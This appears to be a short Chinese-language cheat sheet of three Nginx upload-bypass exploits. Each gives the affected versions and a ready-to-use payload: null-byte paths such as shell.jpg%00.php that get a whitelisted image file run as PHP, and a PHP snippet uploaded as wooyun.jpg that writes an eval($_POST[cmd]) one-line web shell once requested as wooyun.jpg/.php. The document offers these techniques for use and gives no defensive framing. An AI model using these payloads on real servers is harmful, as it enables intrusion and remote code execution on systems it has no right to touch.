### nginx_1

利用范围:
- Nginx 0.5.*
- Nginx 0.6.*
- Nginx 0.7 <= 0.7.65
- Nginx 0.8 <= 0.8.37
  
以上Nginx容器的版本下，上传一个在waf白名单之内扩展名的文件shell.jpg，然后以
shell.jpg%00.php进行请求。

### nginx_2

利用范围
- Nginx 0.8.41–1.5.6  

以上Nginx容器的版本下，上传一个在waf白名单之内扩展名的文件shell.jpg，然后以
shell.jpg%20%00.php进行请求。

### nginx_3

利用范围：
- IIS 7.0/7.5且Nginx < 0.8.3
  
默认php配置文件cgi.fix_pathinfo=1时，上传一个名字为wooyun.jpg，内容为
```php
<?PHP 
fputs(fopen('shell.php','w'),'<?phpeval($_POST[cmd])?>');
?>
```
访问wooyun.jpg/.php,在这个目录下就会生成一句话木马 shell.php